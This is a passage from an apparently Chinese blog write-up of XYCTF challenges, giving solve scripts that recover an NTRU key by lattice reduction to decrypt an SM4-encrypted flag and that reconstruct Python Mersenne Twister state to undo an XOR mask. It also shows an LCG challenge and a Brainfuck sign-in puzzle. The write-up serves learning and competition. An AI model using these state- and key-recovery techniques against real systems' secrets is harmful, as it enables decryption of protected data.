<p>可以看到上述代码生成一个随机多项式$m(x)$，并通过<code>terms</code>（以及反编译出来的代码中没有使用到的<code>gen_key</code>）来讲多项式转换为SM4的密钥对flag进行加密，之后使用NTRU加密多项式$m(x)$，最后将NTRU的公钥写入pub_key.txt，将NTRU的密文写入enc.txt，NTRU相关可以参考这篇博客：<a href="https://triodelzx.github.io/2025/04/09/NTRU/">NTRU | Triode Field</a>，通过如下代码就可以求解出flag：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> gmssl <span class="keyword">import</span> sm4</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">terms</span>(<span class="params">poly_str</span>):</span><br><span class="line">    terms = []</span><br><span class="line">    pattern = <span class="string">r&#x27;([+-]?\s*x\^?\d*|[-+]?\s*\d+)&#x27;</span></span><br><span class="line">    matches = re.finditer(pattern, poly_str.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">match</span> <span class="keyword">in</span> matches:</span><br><span class="line">        term = <span class="keyword">match</span>.group()</span><br><span class="line">        <span class="keyword">if</span> term == <span class="string">&#x27;+x&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">            terms.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> term == <span class="string">&#x27;-x&#x27;</span>:</span><br><span class="line">            terms.append(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x^&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            exponent = <span class="built_in">int</span>(term.split(<span class="string">&#x27;x^&#x27;</span>)[<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                coeff = <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                coeff = -<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                coeff = <span class="built_in">int</span>(coeff_part)</span><br><span class="line">            terms.append(coeff * exponent)</span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">in</span> term:</span><br><span class="line">            coeff_part = term.split(<span class="string">&#x27;x&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> coeff_part <span class="keyword">or</span> coeff_part == <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">elif</span> coeff_part == <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">                terms.append(-<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                terms.append(<span class="built_in">int</span>(coeff_part))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> term == <span class="string">&#x27;+1&#x27;</span> <span class="keyword">or</span> term == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                terms.append(<span class="number">0</span>)</span><br><span class="line">                terms.append(-<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> terms</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">poly_terms</span>):</span><br><span class="line">    binary = [<span class="number">0</span>] * <span class="number">128</span></span><br><span class="line">    <span class="keyword">for</span> term <span class="keyword">in</span> poly_terms:</span><br><span class="line">        exponent = <span class="built_in">abs</span>(term)</span><br><span class="line">        <span class="keyword">if</span> term &gt; <span class="number">0</span> <span class="keyword">and</span> exponent &lt;= <span class="number">127</span>:</span><br><span class="line">            binary[<span class="number">127</span> - exponent] = <span class="number">1</span></span><br><span class="line">    binary_str = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, binary))</span><br><span class="line">    hex_key = <span class="built_in">hex</span>(<span class="built_in">int</span>(binary_str, <span class="number">2</span>))[<span class="number">2</span>:].upper().zfill(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">return</span> hex_key</span><br><span class="line"></span><br><span class="line">N = <span class="number">49</span></span><br><span class="line">p = <span class="number">3</span></span><br><span class="line">q = <span class="number">128</span>  </span><br><span class="line">d = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">_R = PolynomialRing(ZZ, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">R = _R.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_Rp = PolynomialRing(Zmod(p), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">Rp = _Rp.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">_Rq = PolynomialRing(Zmod(q), <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">Rq = _Rq.quotient(x^N - <span class="number">1</span>, <span class="string">&#x27;x&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">center_lift</span>(<span class="params">Rm, R, f</span>):</span><br><span class="line">    modulo = ZZ(Rm(<span class="built_in">list</span>(f)).base_ring()(-<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">    l = [ZZ(x) <span class="keyword">if</span> x &lt;= modulo // <span class="number">2</span> <span class="keyword">else</span> ZZ(x) - modulo <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">list</span>(f)]</span><br><span class="line">    <span class="keyword">return</span> R(l)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">Rm, f</span>):</span><br><span class="line">    <span class="keyword">return</span> Rm(f).inverse()</span><br><span class="line"></span><br><span class="line">h = R(<span class="string">&quot;...&quot;</span>)</span><br><span class="line">e = R(<span class="string">&quot;...&quot;</span>)</span><br><span class="line"></span><br><span class="line">L = matrix(ZZ, <span class="number">2</span>*N, <span class="number">2</span>*N)</span><br><span class="line"></span><br><span class="line">h_coeff = [ZZ(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">list</span>(h)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    L[i, i] = <span class="number">1</span></span><br><span class="line">    L[N + i, N + i] = q</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        L[i, N + j] = h_coeff[(j - i) % N]\</span><br><span class="line"></span><br><span class="line">res = L.BKZ()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">v = <span class="built_in">list</span>(res[:N])</span><br><span class="line">f = R([ZZ(x) <span class="keyword">for</span> x <span class="keyword">in</span> v])</span><br><span class="line">Fp = Rp(<span class="built_in">list</span>(f)).inverse()</span><br><span class="line">a = center_lift(Rq, R, Rq(<span class="built_in">list</span>(f * e)))</span><br><span class="line">m = center_lift(Rp, R, Rp(<span class="built_in">list</span>(Fp * a)))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">poly_terms = terms(<span class="built_in">str</span>(m))</span><br><span class="line">key = gen_key(poly_terms)</span><br><span class="line">sm4_key = binascii.unhexlify(key)</span><br><span class="line"><span class="built_in">print</span>(sm4_key.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">sm4 = sm4.CryptSM4(sm4_key)</span><br><span class="line">sm4.set_key(sm4_key, gmssl.sm4.SM4_DECRYPT)</span><br><span class="line"></span><br><span class="line">ct = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;bf0cb5cc6bea6146e9c1f109df953a57daa416d38a8ffba6438e7e599613e01f3b9a53dace4ccd55cd3e55ef88e0b835&quot;</span>)</span><br><span class="line">pt = sm4.crypt_ecb(ct)</span><br><span class="line"><span class="built_in">print</span>(unpad(pt, <span class="number">16</span>))</span><br></pre></td></tr></table></figure><br>事实上，我们可以发现，在<code>enc.txt</code>中除了$e$之外还有一个多出来的多项式：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-x^<span class="number">48</span> - x^<span class="number">46</span> + x^<span class="number">45</span> + x^<span class="number">43</span> - x^<span class="number">42</span> + x^<span class="number">41</span> + x^<span class="number">40</span> + x^<span class="number">36</span> - x^<span class="number">35</span> + x^<span class="number">34</span> - x^<span class="number">33</span> + x^<span class="number">32</span> - x^<span class="number">30</span> + x^<span class="number">29</span> - x^<span class="number">28</span> - x^<span class="number">27</span> - x^<span class="number">26</span> - x^<span class="number">25</span> - x^<span class="number">23</span> - x^<span class="number">22</span> + x^<span class="number">21</span> + x^<span class="number">20</span> + x^<span class="number">19</span> + x^<span class="number">18</span> - x^<span class="number">17</span> - x^<span class="number">16</span> - x^<span class="number">15</span> - x^<span class="number">14</span> - x^<span class="number">12</span> + x^<span class="number">9</span> - x^<span class="number">7</span> - x^<span class="number">6</span> - x^<span class="number">5</span> - x^<span class="number">4</span> + x^<span class="number">3</span> - x + <span class="number">1</span></span><br></pre></td></tr></table></figure><br>这个多项式实际上就是NTRU加密一步使用的明文，也就是最后被用于转换为SM4的密钥的多项式.</p>
<h3 id="choice（复现）"><a href="#choice（复现）" class="headerlink" title="choice（复现）"></a>choice（复现）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long  </span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;XYCTF&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)  </span><br><span class="line">flag = flag[<span class="number">6</span>:-<span class="number">1</span>]  </span><br><span class="line">  </span><br><span class="line">msg = bytes_to_long(flag)  </span><br><span class="line">rand = Random()  </span><br><span class="line">test = <span class="built_in">bytes</span>([i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>, -<span class="number">1</span>, -<span class="number">1</span>)])  </span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;output.py&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">f&#x27;enc = <span class="subst">&#123;msg ^ rand.getrandbits(msg.bit_length())&#125;</span>\nr = <span class="subst">&#123;[rand.choice(test) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2496</span>)]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>给了上面的代码还有random.py，跟Python库里面的random.py差距挺大的，但是据出题人的说法修改的是第246行，对应的是<code>_randbelow_with_getrandbits</code>函数，原本的这个函数实现如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_randbelow_with_getrandbits</span>(<span class="params">self, n</span>):  </span><br><span class="line">    <span class="string">&quot;Return a random int in the range [0,n).  Defined for n &gt; 0.&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    getrandbits = self.getrandbits  </span><br><span class="line">    k = n.bit_length()  <span class="comment"># don&#x27;t use (n-1) here because n can be 1  </span></span><br><span class="line">    r = getrandbits(k)  <span class="comment"># 0 &lt;= r &lt; 2**k  </span></span><br><span class="line">    <span class="keyword">while</span> r &gt;= n:  </span><br><span class="line">        r = getrandbits(k)  </span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure><br>修改后是这样的：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_randbelow_with_getrandbits</span>(<span class="params">self, n</span>):  </span><br><span class="line">    <span class="string">&quot;Return a random int in the range [0,n).  Defined for n &gt; 0.&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    getrandbits = self.getrandbits  </span><br><span class="line">    k = n.bit_length() - <span class="number">1</span>  </span><br><span class="line">    r = getrandbits(k)  <span class="comment"># 0 &lt;= r &lt; 2**k  </span></span><br><span class="line">    <span class="keyword">while</span> r &gt;= n:  </span><br><span class="line">        r = getrandbits(k)  </span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure><br>其实就是将<code>k = n.bit_length()</code>修改成了<code>k = n.bit_length() - 1</code>，再看到题目主要使用的<code>choice</code>函数实现如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">self, seq</span>):  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;Choose a random element from a non-empty sequence.&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># As an accommodation for NumPy, we don&#x27;t use &quot;if not seq&quot;  </span></span><br><span class="line">    <span class="comment"># because bool(numpy.array()) raises a ValueError.    if not len(seq):  </span></span><br><span class="line">        <span class="keyword">raise</span> IndexError(<span class="string">&#x27;Cannot choose from an empty sequence&#x27;</span>)  </span><br><span class="line">    <span class="keyword">return</span> seq[self._randbelow(<span class="built_in">len</span>(seq))]</span><br></pre></td></tr></table></figure><br>如果用原来的代码的话在进行<code>rand.choice(test)</code>的时候<code>_randbelow_with_getrandbits</code>就会生成9-bits的随机数，若大于等于256就会重新选取，这样的话得到的状态是不连续的，就没有办法恢复状态并倒推了，所以将<code>k = n.bit_length()</code>修改成了<code>k = n.bit_length() - 1</code>就可以避免这种情况，恢复状态的话GitHub上<a target="_blank" rel="noopener" href="https://github.com/JuliaPoo/MT19937-Symbolic-Execution-and-Solver">这个项目</a>就可以做到，通过下述代码就可以恢复状态并实现倒推：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">&#x27;MT19937-Symbolic-Execution-and-Solver/source&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> MT19937 <span class="keyword">import</span> MT19937</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = <span class="number">5042764371819053176884777909105310461303359296255297</span></span><br><span class="line"></span><br><span class="line">r = [...]</span><br><span class="line">r = [<span class="number">255</span> - x <span class="keyword">for</span> x <span class="keyword">in</span> r]</span><br><span class="line"></span><br><span class="line">rng_clone = MT19937(state_from_data = (r, <span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">length = enc.bit_length()</span><br><span class="line"></span><br><span class="line">rng_clone.reverse_states(length//<span class="number">32</span>+<span class="number">1</span>) <span class="comment"># 括号内参数是要倒推的状态数</span></span><br></pre></td></tr></table></figure><br>恢复状态之后则需要通过手写<code>getrandbits</code>函数来得到（那个项目并没有实现这个功能），根据random库中<code>getrandbits</code>的规则实现<code>getrandbits</code>如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">n</span>):</span><br><span class="line">    out = <span class="number">0</span></span><br><span class="line">    offset = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">32</span>:</span><br><span class="line">        out = rng_clone() &lt;&lt; offset | out</span><br><span class="line">        n -= <span class="number">32</span></span><br><span class="line">        offset += <span class="number">32</span></span><br><span class="line">    out = rng_clone() &gt;&gt; (<span class="number">32</span> - n) &lt;&lt; offset | out</span><br><span class="line">    <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure><br>最终可以直接恢复出flag：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mask = getrandbits(length + <span class="number">3</span>) <span class="comment"># 需要测试，因为不知道原来的位数是多少，只知道密文的位数</span></span><br><span class="line">pt = enc ^^ mask </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(pt))</span><br></pre></td></tr></table></figure></p>
<h3 id="prng-xxxx（待复现）"><a href="#prng-xxxx（待复现）" class="headerlink" title="prng_xxxx（待复现）"></a>prng_xxxx（待复现）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad  </span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5  </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, b, seed  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, seed, a, b</span>):  </span><br><span class="line">        self.seed = seed  </span><br><span class="line">        self.a = a  </span><br><span class="line">        self.b = b  </span><br><span class="line">        self.m = <span class="number">2</span>**<span class="number">128</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):  </span><br><span class="line">        self.seed = (self.seed * self.a + self.b) % self.m  </span><br><span class="line">        <span class="keyword">return</span> (self.seed &gt;&gt; <span class="number">64</span>) ^ (self.seed % <span class="number">2</span>**<span class="number">64</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">lfsr</span>:  </span><br><span class="line">    <span class="comment"># 我被裁了/(ㄒoㄒ)/~~  </span></span><br><span class="line">    <span class="keyword">pass</span>  </span><br><span class="line">  </span><br><span class="line">a = <span class="number">47026247687942121848144207491837523525</span>  </span><br><span class="line"><span class="keyword">assert</span> b &lt; <span class="number">2</span>**<span class="number">128</span> <span class="keyword">and</span> seed &lt; <span class="number">2</span>**<span class="number">128</span>  </span><br><span class="line">lcg = LCG(seed, a, b)  </span><br><span class="line"><span class="built_in">print</span>([lcg.<span class="built_in">next</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> [<span class="number">0</span>] * <span class="number">64</span>])  </span><br><span class="line"><span class="built_in">print</span>(AES.new(key=md5(<span class="built_in">str</span>(seed).encode()).digest(), mode=AES.MODE_ECB).encrypt(pad(flag, <span class="number">16</span>)))  </span><br></pre></td></tr></table></figure>
<p>参考论文：<a target="_blank" rel="noopener" href="https://tosc.iacr.org/index.php/ToSC/article/view/8700/8292">View of Practical seed-recovery for the PCG Pseudo-Random Number Generator</a></p>
<p><del>听说预期解的exp也要跑一个小时，有闲情雅致再复现</del></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签个到吧"><a href="#签个到吧" class="headerlink" title="签个到吧"></a>签个到吧</h3><p>经典Brainfuck，美化代码如下：<br><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line">&gt;<span class="literal">+++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++++++++++++++++++++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++++++++++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span class="line">&lt;</span><br><span class="line"><span class="title">[</span><span class="literal">-</span><span class="title">]</span></span><br><span class="line">&gt;<span class="literal">+++++++</span></span><br><span class="line"><span class="title">[</span>&lt;<span class="literal">+++++++</span>&gt;<span class="literal">-+-+-+-</span><span class="title">]</span></span><br><span 